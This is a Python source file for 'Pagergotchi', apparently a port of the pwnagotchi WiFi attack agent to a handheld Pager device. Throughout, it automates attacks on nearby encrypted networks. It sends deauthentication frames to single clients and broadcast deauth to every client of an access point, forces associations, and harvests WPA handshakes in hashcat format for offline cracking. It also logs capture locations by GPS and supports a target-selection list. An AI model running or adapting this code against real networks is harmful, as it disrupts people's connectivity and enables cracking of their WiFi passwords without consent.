"""
Pagergotchi Agent - Based on original pwnagotchi/agent.py
MINIMAL CHANGES from original - only imports and Pager-specific adaptations
"""
import time
import json
import os
import re
import logging
import asyncio
import threading
from glob import glob

# Changed: pwnagotchi -> pwnagotchi_port
import pwnagotchi_port as pwnagotchi
import pwnagotchi_port.utils as utils
import pwnagotchi_port.plugins as plugins
# Removed: from pwnagotchi.ui.web.server import Server (no web UI on Pager)
from pwnagotchi_port.automata import Automata
from pwnagotchi_port.log import LastSession
from pwnagotchi_port.bettercap import Client
from pwnagotchi_port.mesh.utils import AsyncAdvertiser
from pwnagotchi_port.gps import GPS
from pwnagotchi_port.ap_logger import APLogger

# Payload directory paths (relative to this file's location)
_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
PAYLOAD_DIR = os.path.abspath(os.path.join(_THIS_DIR, '..'))
DATA_DIR = os.path.join(PAYLOAD_DIR, 'data')
RECOVERY_DATA_FILE = os.path.join(DATA_DIR, 'recovery.json')


def channel_to_band(channel):
    """Convert channel number to frequency band string"""
    if channel <= 14:
        return "2G"
    elif channel <= 177:
        return "5G"
    else:
        return "6G"


class Agent(Client, Automata, AsyncAdvertiser):
    def __init__(self, view, config, keypair=None):
        Client.__init__(self,
                        "127.0.0.1" if "hostname" not in config['bettercap'] else config['bettercap']['hostname'],
                        "http" if "scheme" not in config['bettercap'] else config['bettercap']['scheme'],
                        8081 if "port" not in config['bettercap'] else config['bettercap']['port'],
                        "pwnagotchi" if "username" not in config['bettercap'] else config['bettercap']['username'],
                        "pwnagotchi" if "password" not in config['bettercap'] else config['bettercap']['password'])
        Automata.__init__(self, config, view)
        AsyncAdvertiser.__init__(self, config, view, keypair)

        self._started_at = time.time()
        self._current_channel = 0
        self._tot_aps = 0
        self._aps_on_channel = 0
        self._supported_channels = utils.iface_channels(config['main']['iface'])
        self._view = view
        self._view.set_agent(self)
        # Removed: self._web_ui = Server(self, config['ui']) (no web UI on Pager)

        self._access_points = []
        self._last_pwnd = None
        self._history = {}
        self._handshakes = {}
        self._session_handshakes = 0  # Handshakes captured this session
        self._last_total_handshakes = 0  # For detecting new handshakes
        self._known_handshake_files = set()  # Track seen files directly
        self._pineap_handshakes_dir = '/root/loot/handshakes'  # PineAP saves here (not config path!)
        self.last_session = LastSession(self._config)
        self.mode = 'auto'

        if not os.path.exists(config['bettercap']['handshakes']):
            os.makedirs(config['bettercap']['handshakes'])

        # GPS support (optional - works if USB GPS attached)
        gps_device = config.get('gps', {}).get('device', None)
        self._gps = GPS(device=gps_device)

        # AP Logger for WiGLE/normal logging
        self._ap_logger = APLogger(config, self._gps)

        # Menu and exit flags
        self._menu_active = False
        self._exit_requested = False

        # Load settings (sleep timer, privacy mode, etc.)
        from pwnagotchi_port.ui.menu import load_settings
        self._settings = load_settings()

        # Changed: removed fingerprint() call (no mesh on Pager)
        logging.info("%s (v%s)", pwnagotchi.name(), pwnagotchi.__version__)
        for _, plugin in plugins.loaded.items():
            logging.debug("plugin '%s' v%s", plugin.__class__.__name__, plugin.__version__)

    def config(self):
        return self._config

    def view(self):
        return self._view

    def _sleep_with_exit_check(self, duration):
        """Sleep for duration but check for exit/menu every 50ms.
        Returns True if sleep completed, False if interrupted by exit or menu request."""
        remaining = duration
        while remaining > 0:
            if self._exit_requested or getattr(self, '_return_to_menu', False):
                return False
            chunk = min(0.05, remaining)
            time.sleep(chunk)
            remaining -= chunk
        return True

    def supported_channels(self):
        return self._supported_channels

    def setup_events(self):
        logging.info("setting up events...")

        for tag in self._config['bettercap']['silence']:
            try:
                self.run('events.ignore %s' % tag, verbose_errors=False)
            except Exception:
                pass

    def _reset_wifi_settings(self):
        mon_iface = self._config['main']['iface']
        self.run('set wifi.interface %s' % mon_iface)
        self.run('set wifi.ap.ttl %d' % self._config['personality']['ap_ttl'])
        self.run('set wifi.sta.ttl %d' % self._config['personality']['sta_ttl'])
        self.run('set wifi.rssi.min %d' % self._config['personality']['min_rssi'])
        self.run('set wifi.handshakes.file %s' % self._config['bettercap']['handshakes'])
        self.run('set wifi.handshakes.aggregate false')

    def start_monitor_mode(self):
        mon_iface = self._config['main']['iface']
        mon_start_cmd = self._config['main'].get('mon_start_cmd', '')
        restart = not self._config['main'].get('no_restart', False)
        has_mon = False

        while has_mon is False:
            s = self.session()
            for iface in s.get('interfaces', []):
                if iface['name'] == mon_iface:
                    logging.info("found monitor interface: %s", iface['name'])
                    has_mon = True
                    break

            if has_mon is False:
                if mon_start_cmd is not None and mon_start_cmd != '':
                    logging.info("starting monitor interface ...")
                    self.run('!%s' % mon_start_cmd)
                else:
                    logging.info("waiting for monitor interface %s ...", mon_iface)
                    time.sleep(1)
                # Changed: on Pager, assume interface is ready after first check
                has_mon = True

        logging.info("supported channels: %s", self._supported_channels)
        logging.info("handshakes will be collected inside %s", self._config['bettercap']['handshakes'])

        self._reset_wifi_settings()

        wifi_running = self.is_module_running('wifi')
        if wifi_running and restart:
            logging.debug("restarting wifi module ...")
            self.restart_module('wifi.recon')
            self.run('wifi.clear')
        elif not wifi_running:
            logging.debug("starting wifi module ...")
            self.start_module('wifi.recon')

        self.start_advertising()

    def _wait_bettercap(self):
        # Changed: on Pager, PineAP is always ready
        try:
            _s = self.session()
            return
        except Exception:
            logging.info("PineAP backend ready")

    def start(self):
        self._wait_bettercap()
        self.setup_events()
        self.set_starting()
        time.sleep(3)  # Show startup message for 3 seconds
        self.start_monitor_mode()
        # Initialize known handshakes from directory so we only track NEW ones this session
        pattern = os.path.join(self._pineap_handshakes_dir, '*.22000')
        self._known_handshake_files = set(glob(pattern))
        logging.info(f"[agent] Starting with {len(self._known_handshake_files)} existing handshakes")
        self.start_event_polling()
        self.start_session_fetcher()
        # Start GPS (optional - no error if not available)
        if self._gps.start():
            logging.info("GPS enabled")
        # Start AP logger if enabled
        self._ap_logger.start()
        # print initial stats
        self.next_epoch()
        self.set_ready()

    def recon(self):
        recon_time = self._config['personality']['recon_time']
        max_inactive = self._config['personality']['max_inactive_scale']
        recon_mul = self._config['personality']['recon_inactive_multiplier']
        channels = self._config['personality']['channels']

        if self._epoch.inactive_for >= max_inactive:
            recon_time *= recon_mul

        self._view.set('channel', '*')

        if not channels:
            self._current_channel = 0
            logging.debug("RECON %ds", recon_time)
            self.run('wifi.recon.channel clear')
        else:
            logging.debug("RECON %ds ON CHANNELS %s", recon_time, ','.join(map(str, channels)))
            try:
                self.run('wifi.recon.channel %s' % ','.join(map(str, channels)))
            except Exception as e:
                logging.exception("Error while setting wifi.recon.channels (%s)", e)

        self.wait_for(recon_time, sleeping=False)

    def set_access_points(self, aps):
        self._access_points = aps
        plugins.on('wifi_update', self, aps)
        self._epoch.observe(aps, list(self._peers.values()))
        # Log APs if logging is enabled
        if self._ap_logger:
            self._ap_logger.log_aps(aps)
        return self._access_points

    def _ap_matches_list(self, ap, target_list):
        """Check if AP matches any entry in target list (whitelist or blacklist)"""
        hostname = ap.get('hostname', '').lower()
        mac = ap.get('mac', '').lower()

        for entry in target_list:
            entry_ssid = entry.get('ssid', '').lower()
            entry_bssid = entry.get('bssid', '').lower()

            # Exact match by SSID
            if entry_ssid and hostname and entry_ssid == hostname:
                return True
            # Exact match by BSSID
            if entry_bssid and mac and entry_bssid == mac:
                return True
        return False

    def get_access_points(self):
        # Get whitelist/blacklist from settings
        whitelist = self._settings.get('whitelist', [])
        blacklist = self._settings.get('blacklist', [])

        # Also include old config whitelist for compatibility
        old_whitelist = self._config['main'].get('whitelist', [])
        for ssid in old_whitelist:
            if ssid and not any(e.get('ssid', '').lower() == ssid.lower() for e in whitelist):
                whitelist.append({'ssid': ssid, 'bssid': ''})

        aps = []
        try:
            s = self.session()
            plugins.on("unfiltered_ap_list", self, s['wifi']['aps'])
            for ap in s['wifi']['aps']:
                # Skip open networks
                if ap.get('encryption', '') == '' or ap.get('encryption', '') == 'OPEN':
                    continue

                # If blacklist has entries, ONLY target those (blacklist mode)
                if blacklist:
                    if self._ap_matches_list(ap, blacklist):
                        aps.append(ap)
                    # Skip if not in blacklist
                    continue

                # Otherwise, use whitelist to exclude (whitelist mode)
                if self._ap_matches_list(ap, whitelist):
                    continue

                aps.append(ap)
        except Exception as e:
            logging.exception("Error while getting access points (%s)", e)

        aps.sort(key=lambda ap: ap.get('channel', 0))
        return self.set_access_points(aps)

    def get_total_aps(self):
        return self._tot_aps

    def get_aps_on_channel(self):
        return self._aps_on_channel

    def get_current_channel(self):
        return self._current_channel

    def get_access_points_by_channel(self):
        aps = self.get_access_points()
        channels = self._config['personality']['channels']
        grouped = {}

        # group by channel
        for ap in aps:
            ch = ap.get('channel', 0)
            # if we're sticking to a channel, skip anything
            # which is not on that channel
            if channels and ch not in channels:
                continue

            if ch not in grouped:
                grouped[ch] = [ap]
            else:
                grouped[ch].append(ap)

        # sort by more populated channels
        return sorted(grouped.items(), key=lambda kv: len(kv[1]), reverse=True)

    def _find_ap_sta_in(self, station_mac, ap_mac, session):
        for ap in session['wifi']['aps']:
            if ap['mac'] == ap_mac:
                for sta in ap.get('clients', []):
                    if sta['mac'] == station_mac:
                        return ap, sta
                return ap, {'mac': station_mac, 'vendor': ''}
        return None

    def _update_uptime(self, s):
        """Update uptime display (right-aligned via view component)"""
        # Uptime is now updated by View's dedicated uptime thread for 1-second updates
        # This method kept for compatibility but View handles the fast updates
        pass

    def _update_counters(self):
        self._tot_aps = len(self._access_points)
        tot_stas = sum(len(ap.get('clients', [])) for ap in self._access_points)
        if self._current_channel == 0:
            self._view.set('aps', '%d' % self._tot_aps)
        else:
            self._aps_on_channel = len([ap for ap in self._access_points if ap.get('channel') == self._current_channel])
            stas_on_channel = sum(
                [len(ap.get('clients', [])) for ap in self._access_points if ap.get('channel') == self._current_channel])
            self._view.set('aps', '%d (%d)' % (self._aps_on_channel, self._tot_aps))

    def _check_handshakes_direct(self):
        """Directly scan handshake directory for new files"""
        # Find all .22000 files
        pattern = os.path.join(self._pineap_handshakes_dir, '*.22000')
        current_files = set(glob(pattern))

        # Find new files (files we haven't seen before)
        new_files = current_files - self._known_handshake_files
        new_count = len(new_files)

        # Always update known files set to keep total count accurate
        self._known_handshake_files = current_files

        if new_count > 0:

            # Get SSID from newest file (by modification time)
            newest_file = max(new_files, key=os.path.getmtime)
            essid = self._extract_essid_from_file(newest_file)
            if essid:
                self._last_pwnd = essid
                logging.info(f"[agent] New handshake captured: {essid}")
            else:
                # Try to get MAC from filename
                filename = os.path.basename(newest_file)
                mac_match = re.search(r'_([0-9A-Fa-f]{12})_', filename)
                if mac_match:
                    raw_mac = mac_match.group(1)
                    self._last_pwnd = ':'.join(raw_mac[i:i+2] for i in range(0, 12, 2))
                logging.info(f"[agent] New handshake captured: {self._last_pwnd or 'unknown'}")

        return new_count

    def _extract_essid_from_file(self, filepath):
        """Extract ESSID from .22000 hashcat file"""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    # Format: WPA*TYPE*PMKID/MIC*MAC_AP*MAC_STA*ESSID_HEX*...
                    parts = line.strip().split('*')
                    if len(parts) >= 6:
                        essid_hex = parts[5]
                        try:
                            return bytes.fromhex(essid_hex).decode('utf-8', errors='ignore')
                        except:
                            pass
        except:
            pass
        return None

    def _update_handshakes(self, new_shakes=0):
        if new_shakes > 0:
            self._epoch.track(handshake=True, inc=new_shakes)
            self._session_handshakes += new_shakes

        # Total = number of .22000 files in handshakes directory
        total_known = len(self._known_handshake_files)
        # Display: session_captures (total_known)
        txt = '%d (%d)' % (self._session_handshakes, total_known)

        if self._last_pwnd is not None and self._session_handshakes > 0:
            # Only show SSID if we captured something THIS session
            display_name = self._last_pwnd
            if self._settings.get('privacy_mode', False):
                from pwnagotchi_port.ui.menu import obfuscate_ssid, obfuscate_mac
                # Could be SSID or MAC, try both
                if ':' in display_name:
                    display_name = obfuscate_mac(display_name)
                else:
                    display_name = obfuscate_ssid(display_name)
            txt += ' [%s]' % display_name

        self._view.set('shakes', txt)

        if new_shakes > 0:
            self._view.on_handshakes(new_shakes)

    def _update_peers(self):
        self._view.set_closest_peer(self._closest_peer, len(self._peers))

    def _reboot(self):
        self.set_rebooting()
        self._save_recovery_data()
        pwnagotchi.reboot()

    def _restart(self, mode='AUTO'):
        self._save_recovery_data()
        pwnagotchi.restart(mode)

    def _save_recovery_data(self):
        logging.warning("writing recovery data to %s ...", RECOVERY_DATA_FILE)
        try:
            with open(RECOVERY_DATA_FILE, 'w') as fp:
                data = {
                    'started_at': self._started_at,
                    'epoch': self._epoch.epoch,
                    'history': self._history,
                    'handshakes': self._handshakes,
                    'last_pwnd': self._last_pwnd
                }
                json.dump(data, fp)
        except Exception as e:
            logging.error("Failed to save recovery data: %s", e)

    def _load_recovery_data(self, delete=True, no_exceptions=True):
        try:
            with open(RECOVERY_DATA_FILE, 'rt') as fp:
                data = json.load(fp)
                logging.info("found recovery data: %s", data)
                self._started_at = data['started_at']
                self._epoch.epoch = data['epoch']
                self._handshakes = data['handshakes']
                self._history = data['history']
                self._last_pwnd = data['last_pwnd']

                if delete:
                    logging.info("deleting %s", RECOVERY_DATA_FILE)
                    os.unlink(RECOVERY_DATA_FILE)
        except:
            if not no_exceptions:
                raise

    def start_session_fetcher(self):
        threading.Thread(target=self._fetch_stats, args=(), name="Session Fetcher", daemon=True).start()

    def _update_battery(self):
        """Update battery indicator (right-aligned via view component)"""
        bat = pwnagotchi.battery()
        charging = pwnagotchi.battery_charging()

        if bat is not None:
            # Show percentage with charging indicator
            if charging:
                text = 'BAT %d%%+' % bat
            else:
                text = 'BAT %d%%' % bat
        else:
            text = 'BAT ?'

        # Just update value - position and alignment handled by view component
        self._view.set('battery', text)

    def _update_gps(self):
        """Update GPS display (right-aligned via view component)"""
        from pwnagotchi_port.ui.menu import obfuscate_gps

        # Check if privacy mode is enabled
        privacy_mode = self._settings.get('privacy_mode', False)

        if self._gps and self._gps.available:
            coords = self._gps.coordinates
            if coords:
                if privacy_mode:
                    # Use fixed privacy coordinates
                    text = obfuscate_gps()
                else:
                    lat = coords['Latitude']
                    lon = coords['Longitude']
                    text = 'LAT %.4f LON %.4f' % (lat, lon)
                self._view.set('gps', text)
            else:
                self._view.set('gps', '')
        elif privacy_mode:
            # No GPS but privacy mode on - show fake coordinates
            self._view.set('gps', obfuscate_gps())
        else:
            # No GPS and no privacy mode - show nothing
            self._view.set('gps', '')

    def _fetch_stats(self):
        while True:
            try:
                s = self.session()
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.session: %s" % repr(err))
                time.sleep(5)
                continue

            try:
                self._update_uptime(s)
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.update_uptimes: %s" % repr(err))

            try:
                self._update_peers()
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.update_peers: %s" % repr(err))
            try:
                self._update_counters()
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.update_counters: %s" % repr(err))
            try:
                # Directly scan for handshake files (simpler and more reliable)
                new_shakes = self._check_handshakes_direct()
                self._update_handshakes(new_shakes)
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.update_handshakes: %s" % repr(err))
            try:
                self._update_battery()
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.update_battery: %s" % repr(err))
            try:
                self._update_gps()
            except Exception as err:
                logging.debug("[agent:_fetch_stats] self.update_gps: %s" % repr(err))

            time.sleep(5)

    async def _on_event(self, msg):
        found_handshake = False
        try:
            jmsg = json.loads(msg)
        except:
            return

        # give plugins access to the events
        try:
            plugins.on('bcap_%s' % re.sub(r"[^a-z0-9_]+", "_", jmsg.get('tag', '').lower()), self, jmsg)
        except Exception as err:
            logging.error("Processing event: %s" % err)

        if jmsg.get('tag') == 'wifi.client.handshake':
            filename = jmsg['data']['file']
            sta_mac = jmsg['data']['station']
            ap_mac = jmsg['data']['ap']
            # PineAP backend extracts ESSID from .22000 file and provides it as ap_name
            ap_name_from_file = jmsg['data'].get('ap_name', '')
            key = "%s -> %s" % (sta_mac, ap_mac)
            if key not in self._handshakes:
                self._handshakes[key] = jmsg
                s = self.session()
                ap_and_station = self._find_ap_sta_in(sta_mac, ap_mac, s)
                if ap_and_station is None:
                    # Use ESSID from handshake file if available, otherwise MAC
                    self._last_pwnd = ap_name_from_file if ap_name_from_file else ap_mac
                    logging.warning("!!! captured new handshake: %s (%s) !!!", self._last_pwnd, key)
                    plugins.on('handshake', self, filename, ap_mac, sta_mac)
                else:
                    (ap, sta) = ap_and_station
                    # Prefer: 1) hostname from session, 2) ESSID from file, 3) MAC
                    hostname = ap.get('hostname', '')
                    if hostname and hostname != '<hidden>':
                        self._last_pwnd = hostname
                    elif ap_name_from_file:
                        self._last_pwnd = ap_name_from_file
                    else:
                        self._last_pwnd = ap_mac
                    logging.warning(
                        "!!! captured new handshake on channel %d, %d dBm: %s (%s) -> %s [%s (%s)] !!!",
                        ap.get('channel', 0), ap.get('rssi', 0), sta['mac'], sta.get('vendor', ''),
                        self._last_pwnd, ap['mac'], ap.get('vendor', ''))
                    plugins.on('handshake', self, filename, ap, sta)
                found_handshake = True
                # Save GPS coordinates if available
                if self._gps.available:
                    self._gps.save_coordinates(filename)
            self._update_handshakes(1 if found_handshake else 0)

    def _event_poller(self, loop):
        self._load_recovery_data()
        self.run('events.clear')

        while True:
            logging.debug("[agent:_event_poller] polling events ...")
            try:
                loop.create_task(self.start_websocket(self._on_event))
                loop.run_forever()
                logging.debug("[agent:_event_poller] loop loop loop")
            except Exception as ex:
                logging.debug("[agent:_event_poller] Error while polling via websocket (%s)", ex)

    def start_event_polling(self):
        threading.Thread(target=self._event_poller, args=(asyncio.new_event_loop(),), name="Event Polling", daemon=True).start()

    def is_module_running(self, module):
        s = self.session()
        for m in s.get('modules', []):
            if m['name'] == module:
                return m['running']
        return False

    def start_module(self, module):
        self.run('%s on' % module)

    def restart_module(self, module):
        self.run('%s off; %s on' % (module, module))

    def _has_handshake(self, bssid):
        for key in self._handshakes:
            if bssid.lower() in key:
                return True
        return False

    def _should_interact(self, who):
        if self._has_handshake(who):
            return False

        elif who not in self._history:
            self._history[who] = 1
            return True

        else:
            self._history[who] += 1

        return self._history[who] < self._config['personality']['max_interactions']

    def _obfuscate_ap(self, ap):
        """Return obfuscated copy of AP dict if privacy mode is on"""
        from pwnagotchi_port.ui.menu import obfuscate_ssid, obfuscate_mac
        if not self._settings.get('privacy_mode', False):
            return ap
        obfuscated = ap.copy()
        if 'hostname' in obfuscated and obfuscated['hostname']:
            obfuscated['hostname'] = obfuscate_ssid(obfuscated['hostname'])
        if 'mac' in obfuscated and obfuscated['mac']:
            obfuscated['mac'] = obfuscate_mac(obfuscated['mac'])
        return obfuscated

    def _obfuscate_sta(self, sta):
        """Return obfuscated copy of station dict if privacy mode is on"""
        from pwnagotchi_port.ui.menu import obfuscate_mac
        if not self._settings.get('privacy_mode', False):
            return sta
        obfuscated = sta.copy()
        if 'mac' in obfuscated and obfuscated['mac']:
            obfuscated['mac'] = obfuscate_mac(obfuscated['mac'])
        return obfuscated

    def associate(self, ap, throttle=-1):
        if self.is_stale():
            logging.debug("recon is stale, skipping assoc(%s)", ap['mac'])
            return
        if throttle == -1 and "throttle_a" in self._config['personality']:
            throttle = self._config['personality']['throttle_a']

        if self._config['personality']['associate'] and self._should_interact(ap['mac']):
            self._view.on_assoc(self._obfuscate_ap(ap))

            try:
                logging.info("sending association frame to %s (%s %s) on channel %d [%d clients], %d dBm...",
                             ap.get('hostname', ''), ap['mac'], ap.get('vendor', ''), ap.get('channel', 0),
                             len(ap.get('clients', [])), ap.get('rssi', 0))
                self.run('wifi.assoc %s' % ap['mac'])
                self._epoch.track(assoc=True)
            except Exception as e:
                self._on_error(ap['mac'], e)

            plugins.on('association', self, ap)
            if throttle > 0:
                self._sleep_with_exit_check(throttle)
            self._view.on_normal()

    def deauth(self, ap, sta, throttle=-1):
        if self.is_stale():
            logging.debug("recon is stale, skipping deauth(%s)", sta['mac'])
            return

        if throttle == -1:
            throttle = self._config['personality'].get('throttle_d', 0.9)

        logging.debug("deauth throttle=%s", throttle)

        if self._config['personality']['deauth'] and self._should_interact(sta['mac']):
            self._view.on_deauth(self._obfuscate_sta(sta))

            try:
                logging.info("deauthing %s (%s) from %s (%s %s) on channel %d, %d dBm ...",
                             sta['mac'], sta.get('vendor', ''), ap.get('hostname', ''), ap['mac'],
                             ap.get('vendor', ''), ap.get('channel', 0), ap.get('rssi', 0))
                self.run('wifi.deauth %s %s' % (ap['mac'], sta['mac']))
                self._epoch.track(deauth=True)
            except Exception as e:
                self._on_error(sta['mac'], e)

            plugins.on('deauthentication', self, ap, sta)
            if throttle > 0:
                self._sleep_with_exit_check(throttle)
            self._view.on_normal()

    def broadcast_deauth(self, ap, throttle=-1):
        """Broadcast deauth to kick all clients from AP (PineAP adaptation - no client data available)"""
        if self.is_stale():
            return

        if throttle == -1 and "throttle_d" in self._config['personality']:
            throttle = self._config['personality']['throttle_d']

        if self._config['personality']['deauth'] and self._should_interact(ap['mac']):
            # Use AP name for display instead of broadcast address
            ap_name = ap.get('hostname') or ap.get('mac', 'unknown')
            fake_sta = {'mac': ap_name, 'vendor': 'broadcast'}
            self._view.on_deauth(self._obfuscate_sta(fake_sta))

            try:
                logging.info("broadcast deauth %s (%s) on channel %d",
                             ap.get('hostname', ''), ap['mac'], ap.get('channel', 0))
                self.run('wifi.deauth %s %s' % (ap['mac'], 'FF:FF:FF:FF:FF:FF'))
                self._epoch.track(deauth=True)
            except Exception as e:
                self._on_error(ap['mac'], e)

            plugins.on('deauthentication', self, ap, fake_sta)
            if throttle > 0:
                self._sleep_with_exit_check(throttle)
            self._view.on_normal()

    def set_channel(self, channel, verbose=True):
        if self.is_stale():
            logging.debug("recon is stale, skipping set_channel(%d)", channel)
            return

        # if in the previous loop no client stations has been deauthenticated
        # and only association frames have been sent, we don't need to wait
        # very long before switching channel as we don't have to wait for
        # such client stations to reconnect in order to sniff the handshake.
        wait = 0
        if self._epoch.did_deauth:
            wait = self._config['personality']['hop_recon_time']
        elif self._epoch.did_associate:
            wait = self._config['personality']['min_recon_time']

        if channel != self._current_channel:
            if self._current_channel != 0 and wait > 0:
                if verbose:
                    logging.info("waiting for %ds on channel %d ...", wait, self._current_channel)
                else:
                    logging.debug("waiting for %ds on channel %d ...", wait, self._current_channel)
                self.wait_for(wait)
            if verbose and self._epoch.any_activity:
                logging.info("CHANNEL %d", channel)
            try:
                self.run('wifi.recon.channel %d' % channel)
                self._current_channel = channel
                self._epoch.track(hop=True)
                self._view.set('channel', '%d(%s)' % (channel, channel_to_band(channel)))

                plugins.on('channel_hop', self, channel)

            except Exception as e:
                logging.error("Error while setting channel (%s)", e)

    def stop(self):
        """Stop the agent and cleanup resources"""
        logging.info("Stopping agent...")
        # Stop AP logger
        if self._ap_logger:
            self._ap_logger.stop()
        # Stop GPS
        if self._gps:
            self._gps.stop()
        # Stop backend (Client.stop)
        Client.stop(self)
